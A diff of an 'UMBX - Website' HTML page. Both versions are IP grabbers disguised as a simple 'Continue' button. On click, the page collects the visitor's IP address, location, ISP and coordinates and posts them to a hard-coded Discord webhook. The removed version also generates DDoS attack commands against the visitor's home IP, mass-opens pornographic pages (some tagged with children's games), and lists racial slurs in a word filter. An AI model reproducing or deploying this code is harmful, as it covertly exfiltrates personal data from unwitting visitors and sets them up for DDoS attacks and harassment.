@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ts pmo..</title>
+    <title>UMBX - Website</title>
     <style>
         body {
             margin: 0;
@@ -16,7 +16,6 @@
             justify-content: center;
             align-items: center;
             overflow: hidden;
-            transition: background 0.5s ease;
         }
         
         .container {
@@ -24,135 +23,6 @@
             position: relative;
             max-width: 90%;
             width: 450px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        
-        .info-container {
-            display: none;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 0 20px rgba(93, 63, 211, 0.3);
-            animation: fadeIn 1s ease-in-out, glowBorder 2s infinite alternate;
-            width: 100%;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .info-title {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #5D3FD3;
-            text-shadow: 0 0 10px rgba(93, 63, 211, 0.5);
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            text-align: left;
-        }
-
-        .info-item {
-            background: rgba(93, 63, 211, 0.1);
-            padding: 10px;
-            border-radius: 8px;
-            transition: transform 0.3s ease;
-        }
-
-        .info-item:hover {
-            transform: scale(1.02);
-            background: rgba(93, 63, 211, 0.2);
-        }
-
-        .info-label {
-            color: #00FFFF;
-            font-size: 0.9em;
-            margin-bottom: 5px;
-        }
-
-        .info-value {
-            color: white;
-            font-size: 1.1em;
-        }
-
-        .connection-status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
-            font-weight: bold;
-        }
-
-        .home-connection {
-            background: rgba(0, 255, 0, 0.1);
-            color: #00ff00;
-        }
-
-        .proxy-connection {
-            background: rgba(255, 0, 0, 0.1);
-            color: #ff0000;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes glowBorder {
-            from { box-shadow: 0 0 20px rgba(93, 63, 211, 0.3); }
-            to { box-shadow: 0 0 30px rgba(0, 255, 255, 0.3); }
-        }
-        
-        .video-container {
-            display: none;
-            margin-top: 20px;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
-            animation: fadeIn 1s ease-in-out;
-            position: relative;
-            background: #000;
-            aspect-ratio: 4/3;
-            width: 100%;
-            max-width: 640px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .video-container iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        
-        .video-error {
-            display: none;
-            color: #ff4444;
-            text-align: center;
-            padding: 10px;
-            margin-top: 10px;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .success-message {
-            display: none;
-            color: #00FFFF;
-            font-size: 1.2rem;
-            margin: 15px 0;
-            text-shadow: 0 0 10px #00FFFF;
-            animation: glowText 2s ease-in-out infinite;
-        }
-        
-        @keyframes glowText {
-            0% { text-shadow: 0 0 10px #00FFFF; }
-            50% { text-shadow: 0 0 20px #00FFFF, 0 0 30px #5D3FD3; }
-            100% { text-shadow: 0 0 10px #00FFFF; }
         }
         
         .continue-btn {
@@ -166,42 +36,9 @@
             transition: all 0.3s ease;
             box-shadow: 0 0 10px #00FFFF;
             animation: glow 1.5s ease-in-out infinite alternate;
-            margin-top: 15px;
         }
         
-        .continue-btn:disabled {
-            background-color: #333333;
-            cursor: not-allowed;
-            box-shadow: none;
-            animation: none;
-        }
-        
-        .username-input {
-            width: 100%;
-            padding: 12px 20px;
-            margin-bottom: 15px;
-            border: 2px solid #5D3FD3;
-            border-radius: 30px;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 1rem;
-            text-align: left;
-            outline: none;
-            transition: all 0.3s ease;
-            box-sizing: border-box;
-        }
-        
-        .username-input:focus {
-            border-color: #00FFFF;
-            box-shadow: 0 0 10px #00FFFF;
-        }
-        
-        .username-input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-            text-align: left;
-        }
-        
-        .continue-btn:hover:not(:disabled) {
+        .continue-btn:hover {
             background-color: #00FFFF;
             color: #0B0B0F;
         }
@@ -214,250 +51,73 @@
                 box-shadow: 0 0 10px #00FFFF, 0 0 20px #00FFFF;
             }
         }
-        
-        .fallback-btn {
-            display: none;
-            margin: 15px auto;
-            padding: 10px 20px;
-            background-color: #5D3FD3;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 10px #00FFFF;
-            animation: glow 1.5s ease-in-out infinite alternate;
-            text-decoration: none;
-        }
-        
-        .fallback-btn:hover {
-            background-color: #00FFFF;
-            color: #0B0B0F;
-            text-decoration: none;
-        }
-
-        .countdown {
-            display: none;
-            font-size: 2.5rem;
-            color: #5D3FD3;
-            text-shadow: 0 0 10px rgba(93, 63, 211, 0.5);
-            margin-top: 20px;
-            font-weight: bold;
-            animation: pulse 1s infinite alternate;
-        }
-
-        @keyframes pulse {
-            from { text-shadow: 0 0 10px rgba(93, 63, 211, 0.5); }
-            to { text-shadow: 0 0 20px rgba(0, 255, 255, 0.5); }
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <input type="text" id="usernameInput" class="username-input" placeholder="Enter your username" required>
         <button id="continueBtn" class="continue-btn">Continue</button>
-        <div id="infoContainer" class="info-container">
-            <h2 class="info-title">ts pmo..</h2>
-            <div class="info-grid">
-                <div class="info-item">
-                    <div class="info-label">Username</div>
-                    <div id="usernameValue" class="info-value"></div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">IP Address</div>
-                    <div id="ipValue" class="info-value"></div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Location</div>
-                    <div id="locationValue" class="info-value"></div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">ISP</div>
-                    <div id="ispValue" class="info-value"></div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Timezone</div>
-                    <div id="timezoneValue" class="info-value"></div>
-                </div>
-            </div>
-            <div id="connectionStatus" class="connection-status"></div>
-        </div>
-        <div id="countdown" class="countdown">5</div>
-        <audio id="backgroundAudio" loop>
-            <source src="https://cdn.discordapp.com/attachments/1147841758612807720/1148560473597947914/phonk.mp3" type="audio/mpeg">
-        </audio>
     </div>
 
     <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1358881644928438302/MjGiGYxHCQ-A3_NUxCxGnEQA4gH5bq4ZT5WkMOgb8QOI5Fe3egRVmhjDAnswjHDzYLB-';
-        const continueBtn = document.getElementById('continueBtn');
-        const usernameInput = document.getElementById('usernameInput');
-        const infoContainer = document.getElementById('infoContainer');
-        const audio = document.getElementById('backgroundAudio');
-        
-        // Disable continue button initially
-        continueBtn.disabled = true;
-        
-        // List of inappropriate words to check against
-        const inappropriateWords = ['nigga', 'niggas', 'nigger', 'nega', 'retard'];
-        
-        function validateUsername(username) {
-            if (username.length < 4) return false;
-            
-            const lowerUsername = username.toLowerCase();
-            return !inappropriateWords.some(word => lowerUsername.includes(word));
-        }
-        
-        usernameInput.addEventListener('input', function() {
-            const username = this.value.trim();
-            continueBtn.disabled = !validateUsername(username);
-        });
-        
-        // List of websites to open (replace these with your desired websites)
-        const websites = [
-            'https://www.pornhub.com/view_video.php?viewkey=67e53a912da49',
-            'https://playadultgames.space/lg/4girls_shadow/?clickid=cvqgo4h31urs73dq0pvg&t1_md5=ed36ae7acbbb6e0b3994999044e54589&t2_md5=ce6829dc213ea1d2f0c2b96b16d0a43e&t3_md5=9d5c0c1291fb890f0a6e089cb433993e&campaign=1056',
-            'https://rule34.xxx/index.php?page=post&s=view&id=13088060',
-            'https://rule34.xxx/index.php?page=post&s=view&id=13087199&tags=fortnite',
-            'https://rule34.xxx/index.php?page=post&s=view&id=13087558&tags=fortnite',
-            'https://rule34.xxx/index.php?page=post&s=view&id=13082390&tags=roblox',
-            "https://de.im9.eu/picture/8129",
-            'https://die-besten-100.de/bilder/sexy/8214/Zeig+mir+dein+Tattoo+-+Gut+so+Hot+naked+Girl+with+Intim+Tattoo.html',
-            'https://www.google.com/search?sca_esv=0d78bd417f86bbf5&rlz=1C1NMEO_enDE1134DE1135&q=hot%20naked%20girls&udm=2&fbs=ABzOT_DDfJxgmsKFIwrWKcoyw2Rf7ED7CYyDAoRz3agYVnoe8UVw8adpCRzSzq6xx654mB8SrwXfVVO-7Tv6OBhK4S8C3f-Zbgt3_KWeEqX-sQ3aLUU3Ua62XuTpxcz1JM1IZergwPbLrAzN2MJhkqeOzLLh8dwDF-2ltDhwsYnHhtW1AGQDkG8gsII3tg2tvhWGmA6v8SOO&sa=X&ved=2ahUKEwid0tydrsiMAxVQ2AIHHajLMiUQm-ELegQIBRAE&biw=1920&bih=957&dpr=1&no_sw_cr=1&zx=1744112732493&sssc=1&vet=12ahUKEwid0tydrsiMAxVQ2AIHHajLMiUQm-ELegQIBRAE..i#vhid=FVzmVzv4k89aPM&vssid=mosaic',
-            'https://www.nakedgirls.mobi/videos/2132/two-young-naked-girls-in-a-hot-threesome/'
-        ];
-
-        function openWebsites() {
-            const timesToOpen = 3;
-            websites.forEach(site => {
-                for (let i = 0; i < timesToOpen; i++) {
-                    setTimeout(() => {
-                        window.open(site, '_blank');
-                    }, i * 100); // Small delay between each open
-                }
-            });
-        }
-
-        function startCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            countdownElement.style.display = 'block';
-            
-            let count = 5;
-            const countdownInterval = setInterval(() => {
-                countdownElement.textContent = count;
-                if (count <= 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.style.display = 'none';
-                    openWebsites();
-                }
-                count--;
-            }, 1000);
-        }
-
-        continueBtn.addEventListener('click', async function() {
-            const username = usernameInput.value.trim();
-            
-            if (!validateUsername(username)) {
-                alert('Please enter a valid username (at least 4 characters long and no inappropriate words)');
-                return;
-            }
+        document.getElementById('continueBtn').addEventListener('click', function() {
             
             this.disabled = true;
             this.textContent = 'Loading...';
             
-            try {
-                // Start playing audio
-                const audioPromise = audio.play();
-                if (audioPromise !== undefined) {
-                    audioPromise.catch(error => console.error("Audio playback failed:", error));
-                }
-                
-                // Change background to black
-                document.body.style.background = '#000';
-                
-                // Get IP information
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                
-                // Get location information
-                const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-                const locationData = await locationResponse.json();
-                
-                // Update the info display
-                document.getElementById('usernameValue').textContent = username;
-                document.getElementById('ipValue').textContent = ipAddress;
-                document.getElementById('locationValue').textContent = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
-                document.getElementById('ispValue').textContent = locationData.org || 'Unknown';
-                document.getElementById('timezoneValue').textContent = locationData.timezone || 'Unknown';
-
-                // Prepare webhook data
-                const webhookData = {
-                    embeds: [{
-                        title: "IP Information Collected - umbx",
-                        color: 5814783,
-                        fields: [
-                            { name: "Username", value: username, inline: true },
-                            { name: "IP Address", value: ipAddress, inline: true },
-                            { name: "Country", value: locationData.country_name || "Unknown", inline: true },
-                            { name: "Region", value: locationData.region || "Unknown", inline: true },
-                            { name: "City", value: locationData.city || "Unknown", inline: true },
-                            { name: "ISP", value: locationData.org || "Unknown", inline: true },
-                            { name: "Timezone", value: locationData.timezone || "Unknown", inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                // Check proxy status
-                const proxyResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=status,message,proxy,hosting`);
-                const proxyData = await proxyResponse.json();
-                const isProxy = proxyData.proxy || proxyData.hosting;
-                
-                // Update connection status display
-                const connectionStatus = document.getElementById('connectionStatus');
-                connectionStatus.textContent = isProxy ? '⚠️ Proxy/VPN Connection' : '✅ Home Connection';
-                connectionStatus.className = `connection-status ${isProxy ? 'proxy-connection' : 'home-connection'}`;
-                
-                // Add proxy status to webhook with attack commands for home connections
-                webhookData.embeds.push({
-                    title: "Connection Status",
-                    color: isProxy ? 16711680 : 65280,
-                    fields: [{
-                        name: "Connection Type",
-                        value: isProxy ? "⚠️ Proxy/VPN/Data Center Detected" : "✅ Home Connection",
-                        inline: true
-                    }].concat(isProxy ? [] : [{
-                        name: "Attack Commands",
-                        value: `.home-kill ${ipAddress} 80 ${Math.floor(Math.random() * (600 - 60 + 1)) + 60}\n.dns ${ipAddress} 80 60\n.udpmix ${ipAddress} 80 60\n.ldap ${ipAddress} 80 60`,
-                        inline: false
-                    }]),
-                    timestamp: new Date().toISOString()
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ipAddress = ipData.ip;
+                    
+                    
+                    return fetch(`https://ipapi.co/${ipAddress}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            
+                            const webhookData = {
+                                embeds: [{
+                                    title: "IP Information Collected - umbx",
+                                    color: 5814783, 
+                                    fields: [
+                                        { name: "IP Address", value: ipAddress, inline: true },
+                                        { name: "Country", value: data.country_name || "Unknown", inline: true },
+                                        { name: "Region", value: data.region || "Unknown", inline: true },
+                                        { name: "City", value: data.city || "Unknown", inline: true },
+                                        { name: "ISP", value: data.org || "Unknown", inline: true },
+                                        { name: "Proxy/VPN", value: data.proxy ? "Yes" : "No", inline: true },
+                                        { name: "Timezone", value: data.timezone || "Unknown", inline: true },
+                                        { name: "Latitude", value: data.latitude ? data.latitude.toString() : "Unknown", inline: true },
+                                        { name: "Longitude", value: data.longitude ? data.longitude.toString() : "Unknown", inline: true }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            
+                            
+                            return fetch('https://discord.com/api/webhooks/1358881644928438302/MjGiGYxHCQ-A3_NUxCxGnEQA4gH5bq4ZT5WkMOgb8QOI5Fe3egRVmhjDAnswjHDzYLB-', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(webhookData)
+                            });
+                        });
+                })
+                .then(() => {
+                    
+                    document.getElementById('continueBtn').textContent = 'Thank you!';
+                    
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; 
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('continueBtn').textContent = 'Error, try again';
+                    document.getElementById('continueBtn').disabled = false;
                 });
-
-                // Send webhook
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(webhookData)
-                });
-
-                // Hide input elements and show info
-                usernameInput.style.display = 'none';
-                continueBtn.style.display = 'none';
-                infoContainer.style.display = 'block';
-                
-                // Start countdown
-                startCountdown();
-                
-            } catch (error) {
-                console.error('Error:', error);
-                this.textContent = 'Error, try again';
-                this.disabled = false;
-            }
         });
     </script>
 </body>
